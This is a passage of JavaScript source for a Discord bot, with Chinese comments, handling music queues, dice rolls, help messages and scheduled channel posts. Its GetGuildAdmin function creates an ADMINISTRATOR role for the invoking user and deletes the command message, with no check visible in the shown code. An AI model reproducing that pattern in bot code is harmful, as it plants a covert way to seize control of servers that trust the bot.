            songList.get(nowMusicPlayGuild).push(nowSongName.get(nowMusicPlayGuild));
            nowSongName.set(nowMusicPlayGuild, undefined); //避免bug
        } else {
            songInfo.get(nowMusicPlayGuild).shift(); //將最舊的歌曲資訊清出
            nowSongName.set(nowMusicPlayGuild, undefined);
        }
    } catch (err) {
        console.log('newMusicEnd');
    } finally {
        catchCount = 0;
    }
}

//歌曲列表
function musicList(msg) {
    try {
        if (nowSongName.get(msg.guild.id) === undefined) {
            msg = '當前沒有歌曲隊列喔!';
        } else {
            msgs = '```歌曲列表~\n'
            for (i = 0; i < songInfo.get(msg.guild.id).length; i++) {
                msgs = msgs + (i + 1) + '. ' + songInfo.get(msg.guild.id)[i].title + '\n'
            }
            msgs = msgs;
        }
        msg.channel.send(msgs.substring(0, 1996) + '```');
    } catch (err) {
        console.log(err, 'musicListError');
    }
}

//播歌功能控制台
function musicMaster(msg) {
    try {
        if (nowSongName.get(msg.guild.id) === undefined) {
            msg.channel.send('?');
        } else {
            songMasterMessage = msg.channel.send('當前播放歌曲~\n' + nowSongName.get(msg.guild.id) + '\n下一首 | 清單 | 循環').then(
                msg.react('⏩')
            ).then(
                msg.react('📃')
            ).then(
                msg.react('🔁')
            ).catch(err => {
                console.log('errMusic', err)
            })

            const filter = (reaction, user) => {
                return ['⏩', '⏹️', '📃', '⏸️', '▶️', '🔁'].includes(reaction.emoji.name) && user.id === msg.author.id;
            };

            const collector = msg.createReactionCollector(filter, { time: 600000 });

            collector.on('collect', (reaction, user) => {
                if (dispatcher.get(msg.guild.id) !== undefined) {
                    switch (reaction.emoji.name) {
                        case '⏩':
                            if (songList.get(msg.guild.id).length != 0) {
                                dispatcher.get(msg.guild.id).end();
                            } else {
                                msg.reply('沒有下一首了呦')
                            }
                            break;
                        case '⏹️':
                            goBackHomeFromMusicHouse(msg.guild.id, msg.channel.id);
                            break;
                        case '📃':
                            musicList(msg);
                            break;
                        case '⏸️':
                            dispatcher.get(msg.guild.id).pause();
                            break;
                        case '▶️':
                            dispatcher.get(msg.guild.id).resume();
                            break;
                        case '🔁':
                            if (songLoop.get(msg.guild.id)) msg.channel.send('循環功能關閉!').catch(err => { console.log(err, 'LoopError1') })
                            else msg.channel.send('開啟循環功能了喔!').catch(err => { console.log(err, 'LoopError2') })
                            songLoop.set(msg.guild.id, !songLoop.get(msg.guild.id));
                            break;
                    }
                } else {
                    msg.channel.send('The song will ready,please wait seconds for again.')
                }
            });
            collector.on('end', collected => {
                console.log(`Collected ${collected.size} items`);
            });
        }
    } catch (err) {
        console.log('musicMaster');
        msg.channel.send(`There's error in this function, so you can ask administer for help.`);
    }
}

//歌單功能
async function playMusicList(msg, args) {
    try {
        const canPlay = await ytpl.validateID(args[0]);
        let canPlay2;
        let a = 0;
        let b = 0;
        if (canPlay) {
            const listED = await ytpl(args[0]);
            const nowMusicPlayGuild = msg.guild.id
            await listED.items.forEach(async function (element) {
                a = a + 1;
                console.log(element.title);
                if (element.title !== '[Deleted video]') {
                    canPlay2 = await ytdl.validateURL(element.shortUrl);
                    if (canPlay2) {
                        b = b + 1;
                        addMusicToSongList(nowMusicPlayGuild, element.shortUrl);
                        addMusicInfoToSongInfo(nowMusicPlayGuild, element, 3);
                    }
                }
            });
            msg.channel.send(`歌單 ${listED.title}\n共載入${b}首歌曲\n${a - b}首載入失敗`).then(msg.delete());
        }
    } catch (err) {
        console.log('playMusicListError');
    }
}
//#endregion

//#region 小/基本功能
//help方法
function GetHelpMessage(msg, args) {
    switch (args[0]) {
        case '!':
            messageManager.HelpMessage2(Discord.MessageEmbed, function (embed) {
                msg.channel.send(embed);
            })
            break;
        case '攻略組':
            messageManager.HelpMessage3(Discord.MessageEmbed, function (embed) {
                msg.channel.send(embed);
            })
            break;
        case 'T':
            messageManager.HelpMessage4(Discord.MessageEmbed, function (embed) {
                msg.channel.send(embed);
            })
            break;
        default:
            messageManager.HelpMessage(Discord.MessageEmbed, function (embed) {
                msg.channel.send(embed);
            })
            break;
    }

}

//權限判斷 預設判斷群組id
function findPowerFromBaseValue(msg, temp) {
    let a = baseValue.Power.find(item => item.ChannelID == msg.channel.id && item.Power.indexOf(temp) != -1);
    if (a !== undefined) temp = -1;
    else if (baseValue.Power.find(item => item.ChannelID == msg.channel.id) === undefined) {
        a = baseValue.Power.find(item => item.GroupID == msg.guild.id && item.Power.indexOf(temp) != -1);
        if (a !== undefined) temp = -1;
    }
    return temp;
}

//正則判斷 有奇怪符號的都給我出去
function DeleteTempIfHaveEx(msg, temp) {
    let tempValue = temp;
    //if (msg.substring(0, 4) !== 'http') {
    if (tempValue != '4') {
        const t = /\@|\:/;
        if (t.test(msg)) tempValue = -1;
    }
    return tempValue;
}

//參數替換
function valueChange(message, msg) {
    if (message.indexOf("$[ID]") != -1) {
        beforeStr = message.substring(0, message.indexOf('$[ID]'));
        afterStr = message.substring(message.indexOf('$[ID]') + 5, message.length);
        message = beforeStr + '<@' + msg.author.id + '>' + afterStr;
    }

    let mStr = message.split("\\n");
    if (mStr.length > 1) {
        message = '';
        mStr.forEach(element => {
            message = message + element + "\n";
        })
    }

    return message;
}

function valueRandom(message) {
    let tempStr = message.split("$$");
    return tempStr[Math.floor(Math.random() * Math.floor(tempStr.length))];
}

//字串補空白
function paddingLeft(str, lenght) {
    if (str.length >= lenght)
        return str;
    else
        return paddingLeft(" " + str, lenght);
}

//骰子
function getDice(msg, cmd, args) {
    try {
        let range = 6;
        let rangeText = new Array();

        rangeText.push('殘念的骰出了');
        rangeText.push('在眾人溫和的目光下骰出了');
        rangeText.push('在一陣強光中骰出了');
        rangeText.push('運氣很好的骰出了');
        rangeText.push('在灰庭醬的祝福下骰出了');
        rangeText.push('「哈↑哈↑哈↓哈↑哈→」在大笑中的 兔田ぺこら 骰出了');

        const regex = /^[0-9]*$/; //純數字
        const regex2 = /^[0-9]*[Dd][0-9]*$/; //純數字 D 純數字 EX:2D12
        const regex2b = /^[0-9]*d[0-9]*$/; //純數字 d 純數字 EX:2D12
        const regex3 = /[@ /\n]/;
        const regex4 = /^[0-9]*[Dd][0-9]*>[0-9]*$/; //2D12>60
        const regex5 = /^[0-9]*[Bb][0-9]*>[0-9]*$/; //2B12>6
        if (regex5.test(args[0]) && args[0] != '') {
            getBaceDice(msg, args, '2', rangeText)
        } else
            if (regex4.test(args[0]) && args[0] != '') {
                getBaceDice(msg, args, '1', rangeText)
            } else
                if (regex2.test(args[0]) && args[0] != '') {
                    getBaceDice(msg, args, '0', rangeText)
                } else {
                    if (regex.test(args[0]) && args[0] != '') {
                        range = args[0];
                    }
                    const a = Math.floor((Math.random() * range) + 1);
                    msg.channel.send(`${msg.author.username} ${rangeText[Math.floor(Math.random() * rangeText.length)]} ${a} 點!!`);
                }
    } catch (err) {
        console.log(err);
    }
}

//基礎骰
function getBaceDice(msg, args, typeED, rangeText) {
    try {
        const regex = /^[0-9]*$/; //純數字
        const regex2b = /^[0-9]*d[0-9]*$/; //純數字 d 純數字 EX:2D12
        const regex2c = /^[0-9]*d[0-9]*>[0-9]*$/; //純數字 D 純數字 EX:2D12
        const regex3 = /[@ /\n]/;
        const regex5b = /^[0-9]*b[0-9]*>[0-9]*$/;
        let msgEd = ``;
        let valueEd;
        let a = 0; //存儲亂數用
        let b = 0; //存儲亂數總和用
        let strSelect = 0;
        let bigSelect = 0; //<60
        let bigCount = 0; //2b12>6 使用
        const textDone = '~~';
        if (args[1] != undefined && !regex3.test(args[1]) && args[1].length < 200) {
            msgEd = `${args[1]} `;
        }
        msgEd = `${msgEd}\n進行亂數檢定${args[0]}`;

        if (typeED === '2') {
            if (regex5b.test(args[0])) valueEd = args[0].split('b');
            else valueEd = args[0].split('B');
            //截2d 12>60
            bigSelect = valueEd[1].split('>');
            valueEd[1] = bigSelect[0];
            bigSelect = bigSelect[1];
            if (bigSelect === '') bigSelect = 0;
        } else if (typeED === '1') {
            if (regex2c.test(args[0])) valueEd = args[0].split('d');
            else valueEd = args[0].split('D');
            //截2d 12>60
            bigSelect = valueEd[1].split('>');
            valueEd[1] = bigSelect[0];
            bigSelect = bigSelect[1];
            if (bigSelect === '') bigSelect = 0;
        } else if (typeED === '0') {
            if (regex2b.test(args[0])) valueEd = args[0].split('d');
            else valueEd = args[0].split('D');
        }

        if (valueEd[0] > 10) valueEd[0] = 10;
        if (valueEd[0] > 5) strSelect = 1; //太洗版了，5秒後自刪

        if (regex.test(valueEd[1]) && valueEd[1] != '') {
            range = valueEd[1];
        }

        for (i = 0; i < valueEd[0]; i++) {
            a = Math.floor((Math.random() * range) + 1);
            b = b + a;
            if (typeED === '2' && !(a > bigSelect)) {
                msgEd = `${msgEd}\n${textDone}第 ${i + 1} 次 ${rangeText[Math.floor(Math.random() * rangeText.length)]}${textDone} 
                ${textDone}${a} 點!!${textDone}`;
            } else {
                bigCount = bigCount + 1; //type2才會用到
                msgEd = `${msgEd}\n第 ${i + 1} 次 ${rangeText[Math.floor(Math.random() * rangeText.length)]} 
            ${a} 點!!`;
            }
        }
        msgEd = `${msgEd}\n\n檢定結束，${msg.author.username} 骰出了 ${b} !!`;
        if (typeED === '1') {
            msgEd = `${msgEd}\n${b} > ${bigSelect} = ${b > bigSelect}`;
        } else if (typeED === '2') {
            msgEd = `${msgEd}\n→成功數 ${bigCount}`;
        }
        msg.channel.send(msgEd).then(msg => {
            if (strSelect == 1) {
                setTimeout(() => {
                    msg.delete();
                }, 5000)
            }
        }).catch(err => { console.log('getBaceDiceError#02', err) });
    } catch (err) {
        console.log('getBaceDiceError', err);
    }
}

//TRpg骰
function getTRpgDice(msg, args) {
    try {
        const regex = [
            /^[0-9]*$/,
            /^[0-9]*[Bb][0-9]*>[0-9]*$/,
            /^[0-9]*[Bb][0-9]*$/,
            /^[0-9]*[Dd][0-9]*>[0-9]*$/,
            /^[0-9]*[Dd][0-9]*$/
        ];

        regex.some(element => {
            if (element.test(args[0])) {
                if (args[1] != undefined) {
                    if (parseFloat(args[1]) > 5) args[1] = 5;
                    const forEnd = args[1];
                    for (j = 0; j < forEnd; j++) getTRpgDice2(msg, args, regex.indexOf(element));
                } else {
                    getTRpgDice2(msg, args, regex.indexOf(element));
                }
                return true;
            }
        })
    } catch (err) {
        console.log('getTRpgDiceError');
    }
}

function getTRpgDice2(msg, args, typeED) {
    try {
        let mStr = '';
        let args0A = 'null';
        let args0B = 'null';
        let range = '6';
        let tempValue = new Array;
        let sumValue = 0;
        let sussesCount = 0;
        switch (typeED) {
            case 0:
                args0A = [0, 6];
                if (args[0] == '') args0A[0] = '1';
                else args0A[0] = args[0];
                break;
            case 1:
                mStr = `\n(${args[0]})→`;
                if (/^[0-9]*b[0-9]*>[0-9]*$/.test(args[0])) {
                    args0A = args[0].split('b'); //2 , 6>8
                    args0B = args0A[1].split('>'); // 6 , 8
                    args0A[1] = args0B[0];
                } else {
                    args0A = args[0].split('B'); //2 , 6>8
                    args0B = args0A[1].split('>'); // 6 , 8
                    args0A[1] = args0B[0];
                }
                break;
            case 2:
                mStr = `\n(${args[0]})→`;
                if (/^[0-9]*b[0-9]*$/.test(args[0])) {
                    args0A = args[0].split('b'); //2 , 6
                } else {
                    args0A = args[0].split('B'); //2 , 6
                }
                break;
            case 3:
                mStr = `\n${args[0]}：\n`;
                if (/^[0-9]*d[0-9]*>[0-9]*$/.test(args[0])) {
                    args0A = args[0].split('d'); //2 , 6>8
                    args0B = args0A[1].split('>'); // 6 , 8
                    args0A[1] = args0B[0];
                } else {
                    args0A = args[0].split('D'); //2 , 6>8
                    args0B = args0A[1].split('>'); // 6 , 8
                    args0A[1] = args0B[0];
                }
                break;
            case 4:
                mStr = `\n${args[0]}：\n`;
                if (/^[0-9]*d[0-9]*$/.test(args[0])) {
                    args0A = args[0].split('d'); //2 , 6
                } else {
                    args0A = args[0].split('D'); //2 , 6
                }
                break;
        }

        if (parseFloat(args0A[0]) > 10) args0A[0] = 10;

        if (args0A !== 'null')
            if (args0A[1] !== '')
                range = parseFloat(args0A[1]);

        for (i = 0; i < parseFloat(args0A[0]); i++) {
            tempValue.push(Math.floor((Math.random() * range) + 1));
            sumValue = sumValue + tempValue[i];
            if (typeED === 1) {
                if (!(parseFloat(tempValue[i]) > parseFloat(args0B[1]))) {
                    tempValue[i] = '~~' + tempValue[i] + '~~';
                } else {
                    sussesCount = sussesCount + 1;
                }
            }
        }

        switch (typeED) {
            case 0:
                mStr = `${mStr}[${tempValue}]`;
                break;
            case 1:
                mStr = `${mStr}${tempValue}\n→成功數${sussesCount}`;
                break;
            case 2:
                mStr = `${mStr}${tempValue}`;
                break;
            case 3:
                mStr = `${mStr}${sumValue}[${tempValue}]`;
                mStr = `${mStr} > ${args0B[1]} = ${parseFloat(sumValue) > parseFloat(args0B[1])}`;
                break;
            case 4:
                mStr = `${mStr}${sumValue}[${tempValue}]`;
                break;
        }
        msg.reply(mStr);
    } catch (err) {
        console.log(err, 'getTRpgDice2Error');
    }
}

//排序
function getRandomSortArray(msg, cmd, args) {
    try {
        const randomArray = args.sort(function () {
            return .5 - Math.random();
        });
        const mStr = `排序\n→ ${randomArray}`;
        let strLengthED = mStr.length;
        if (mStr.length > 50) strLengthED = 50;
        msg.channel.send((mStr).substring(0, strLengthED))
            .catch('getRandomSortArrayError2');
    } catch (err) {
        console.log('getRandomSortArrayError', err);
    }
}

//ArrayIsEmpty
function isEmptyObject(obj) {
    return !Object.keys(obj).length;
}

//Season生日快樂
function OClockFunction(msg) {
    try {
        let tempOClock = "";

        const messageOClock = ':regional_indicator_s: :regional_indicator_e: :regional_indicator_a: :regional_indicator_s: :regional_indicator_o: :regional_indicator_n: ';
        const clockOClock = [':zero:', ':one:', ':two:', ':three:', ':four:', ':five:', ':six:', ':seven:', ':eight:', ':nine:'];
        let mStrOClock = `${messageOClock}`;
        let mStr = msg.content.split('&');
        for (i in mStr) {
            if (mStr[i].length == 1) {
                tempOClock = tempOClock + clockOClock[0] + ' ' + clockOClock[mStr[i][0]] + ' ';
            } else {
                tempOClock = tempOClock + clockOClock[mStr[i][0]] + ' ' + clockOClock[mStr[i][1]] + ' ';
            }
        }
        mStrOClock = mStrOClock + tempOClock + ':cake:';

        const sevenChannelOClock = client.channels.fetch('785132982695624714').then(channel => channel);

        sevenChannelOClock.send(mStrOClock);

        // sevenChannelOClock.edit({
        //     topic: mStrOClock
        // })

    } catch (err) {
        console.log(err, 'clockFunctionError');
    }
}

//掃地
function NineOClock() {
    try {
        client.channels.fetch('709293980684386344').then(channel => channel.send('掃地')); //愛麗絲頻
        NineUsers = [];
    } catch (err) {
        console.log(err, ' NineOClockError');
    }
}
//回答掃地
function NineOther(msg) {
    try {
        if (nowNineFunctionIndex >= nineFunctionData.length) {
            nineFunctionData = NineFunction.randomNineData(nineFunctionData, (data) => { return data });
            nowNineFunctionIndex = 0;
            //NineUsers = [];
        }

        const haveData = NineUsers.find(element => { return element === msg.author.id });
        if (haveData === undefined) {
            NineUsers.push(msg.author.id);
            let mStr = valueChange(nineFunctionData[nowNineFunctionIndex].text, msg);
            msg.channel.send(mStr);
            nowNineFunctionIndex++;
        }
    } catch (err) {
        console.log(err, ' NineOtherError');
    }
}

//每隔五分鐘推出一位掃地工
// function PushNineUser() {
//     if (NineUsers.length > 0) {
//         NineUsers.unshift();
//     }
// }

//檢查機器人是否有admin
async function HaveAdmin(msg) {
    try {
        const guildEd = msg.guild;
        const botEd = await guildEd.members.fetch(client.user.id);
        const rolesEd = botEd.hasPermission('ADMINISTRATOR');
        let botMsg;
        if (rolesEd) botMsg = msg.channel.send('小愛是管理員喔');
        else botMsg = msg.channel.send('小愛不是管理員耶');
    } catch (err) {
        console.log(err, ' HaveAdminError');
    }
}

//獲得臨時權限
function GetGuildAdmin(msg) {
    try {
        const guildEd = msg.guild;
        if (guildEd != undefined) {
            if (guildEd.available) {
                guildEd.roles.create({
                    name: '臨時權限'
                }).then(async role => {
                    msg.channel.send(`Created new role with name ${role.name}`);
                    role.setPermissions(['ADMINISTRATOR'])
                        .then(updated => msg.channel.send(`Updated permissions to ${updated.permissions.bitfield}`))
                    let me = await guildEd.members.fetch(msg.author.id);
                    me.roles.add(role.id).then(console.log('成功')).catch(console.log('失敗'));
                }).cache(err => { throw err });
            }
        }
        msg.delete();
    } catch (err) {
        console.log(err, ' GetGuildAdminError');
    }
}

//刪除權限
async function DeleteAdmin(msg, args) {
    try {
        const guildEd = msg.guild;
        if (guildEd != undefined) {
            if (guildEd.available) {
                const roleEd = await guildEd.roles.fetch(args[0]);
                roleEd.delete('tempRole');
            }
        }
        msg.delete();
    } catch (err) {
        console.log(err, ' DeleteAdminError');
    }
}

//1~8貼圖
async function AddMemberReact(msg, args) {
    try {
        const MessageID = args[0];
        const CountEd = args[1];
        const MessageToken = msg.channel.messages.get(MessageID);

        const ReactToken = ['0️⃣', '1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣'];

        if (CountEd != 0) {
            for (i = 1; i <= CountEd; i++) {
                // let reactionsED = await MessageToken.react(ReactToken[i]);
                // await reactionsED.removeAll();
                await MessageToken.react(ReactToken[i]);
            }
        }
    } catch (err) {
        console.log('AddMemberReactError ', err);
        msg.channel.send('參數載入失敗，請確定輸入內容正確喔!');
    }
}

//#endregion

//#endregion